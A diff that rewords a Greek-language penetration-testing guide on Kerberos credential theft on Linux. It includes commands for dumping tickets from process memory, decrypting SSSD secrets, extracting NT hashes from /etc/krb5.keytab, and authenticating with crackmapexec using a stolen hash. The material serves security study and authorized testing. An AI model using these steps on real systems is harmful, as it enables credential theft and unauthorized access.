@@ -51,9 +51,9 @@ export KRB5CCNAME=/tmp/krb5cc_1000
 ```
 ### CCACHE ticket reuse from keyring
 
-**Τα εισιτήρια Kerberos που αποθηκεύονται στη μνήμη μιας διαδικασίας μπορούν να εξαχθούν**, ιδιαίτερα όταν η προστασία ptrace της μηχανής είναι απενεργοποιημένη (`/proc/sys/kernel/yama/ptrace_scope`). Ένα χρήσιμο εργαλείο για αυτό το σκοπό βρίσκεται στο [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), το οποίο διευκολύνει την εξαγωγή με την ένεση σε συνεδρίες και την εκφόρτωση εισιτηρίων στο `/tmp`.
+**Τα αποθηκευμένα Kerberos tickets στη μνήμη μιας διαδικασίας μπορούν να εξαχθούν**, ιδιαίτερα όταν η προστασία ptrace της μηχανής είναι απενεργοποιημένη (`/proc/sys/kernel/yama/ptrace_scope`). Ένα χρήσιμο εργαλείο για αυτόν τον σκοπό βρίσκεται στο [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), το οποίο διευκολύνει την εξαγωγή με την ένεση σε συνεδρίες και την εκφόρτωση των tickets στο `/tmp`.
 
-Για να ρυθμίσετε και να χρησιμοποιήσετε αυτό το εργαλείο, ακολουθούνται τα παρακάτω βήματα:
+Για να ρυθμίσετε και να χρησιμοποιήσετε αυτό το εργαλείο, ακολουθούν τα παρακάτω βήματα:
 ```bash
 git clone https://github.com/TarlogicSecurity/tickey
 cd tickey/tickey
@@ -66,14 +66,14 @@ make CONF=Release
 
 Το SSSD διατηρεί ένα αντίγραφο της βάσης δεδομένων στη διαδρομή `/var/lib/sss/secrets/secrets.ldb`. Το αντίστοιχο κλειδί αποθηκεύεται ως κρυφό αρχείο στη διαδρομή `/var/lib/sss/secrets/.secrets.mkey`. Από προεπιλογή, το κλειδί είναι αναγνώσιμο μόνο αν έχετε δικαιώματα **root**.
 
-Η κλήση του **`SSSDKCMExtractor`** με τις παραμέτρους --database και --key θα αναλύσει τη βάση δεδομένων και θα **αποκρυπτογραφήσει τα μυστικά**.
+Η εκτέλεση του **`SSSDKCMExtractor`** με τις παραμέτρους --database και --key θα αναλύσει τη βάση δεδομένων και θα **αποκρυπτογραφήσει τα μυστικά**.
 ```bash
 git clone https://github.com/fireeye/SSSDKCMExtractor
 python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
 ```
-Το **credential cache Kerberos blob μπορεί να μετατραπεί σε ένα χρησιμοποιήσιμο αρχείο Kerberos CCache** που μπορεί να περαστεί σε Mimikatz/Rubeus.
+Το **blob κρυπτογράφησης Kerberos μπορεί να μετατραπεί σε ένα χρησιμοποιήσιμο αρχείο Kerberos CCache** που μπορεί να περαστεί σε Mimikatz/Rubeus.
 
-### CCACHE ticket reuse από keytab
+### Επαναχρησιμοποίηση εισιτηρίου CCACHE από keytab
 ```bash
 git clone https://github.com/its-a-feature/KeytabParser
 python KeytabParser.py /etc/krb5.keytab
@@ -81,9 +81,9 @@ klist -k /etc/krb5.keytab
 ```
 ### Εξαγωγή λογαριασμών από το /etc/krb5.keytab
 
-Οι κωδικοί υπηρεσιών, που είναι απαραίτητοι για υπηρεσίες που λειτουργούν με δικαιώματα root, αποθηκεύονται με ασφάλεια στα αρχεία **`/etc/krb5.keytab`**. Αυτοί οι κωδικοί, παρόμοιοι με τους κωδικούς πρόσβασης για υπηρεσίες, απαιτούν αυστηρή εμπιστευτικότητα.
+Τα κλειδιά λογαριασμού υπηρεσίας, που είναι απαραίτητα για υπηρεσίες που λειτουργούν με δικαιώματα root, αποθηκεύονται με ασφάλεια στα αρχεία **`/etc/krb5.keytab`**. Αυτά τα κλειδιά, παρόμοια με τους κωδικούς πρόσβασης για υπηρεσίες, απαιτούν αυστηρή εμπιστευτικότητα.
 
-Για να ελέγξετε το περιεχόμενο του αρχείου keytab, μπορεί να χρησιμοποιηθεί το **`klist`**. Το εργαλείο έχει σχεδιαστεί για να εμφανίζει λεπτομέρειες κλειδιών, συμπεριλαμβανομένου του **NT Hash** για την αυθεντικοποίηση χρηστών, ιδιαίτερα όταν ο τύπος κλειδιού αναγνωρίζεται ως 23.
+Για να ελέγξετε το περιεχόμενο του αρχείου keytab, μπορεί να χρησιμοποιηθεί το **`klist`**. Το εργαλείο είναι σχεδιασμένο να εμφανίζει λεπτομέρειες κλειδιών, συμπεριλαμβανομένου του **NT Hash** για την αυθεντικοποίηση χρηστών, ιδιαίτερα όταν ο τύπος κλειδιού αναγνωρίζεται ως 23.
 ```bash
 klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
 # Output includes service principal details and the NT Hash
@@ -97,7 +97,7 @@ python3 keytabextract.py krb5.keytab
 ```bash
 ./bifrost -action dump -source keytab -path /path/to/your/file
 ```
-Χρησιμοποιώντας τις εξαγόμενες πληροφορίες λογαριασμού και κατακερματισμού, μπορούν να δημιουργηθούν συνδέσεις με διακομιστές χρησιμοποιώντας εργαλεία όπως το **`crackmapexec`**.
+Χρησιμοποιώντας τις εξαγόμενες πληροφορίες λογαριασμού και hash, μπορούν να δημιουργηθούν συνδέσεις με διακομιστές χρησιμοποιώντας εργαλεία όπως το **`crackmapexec`**.
 ```bash
 crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
 ```
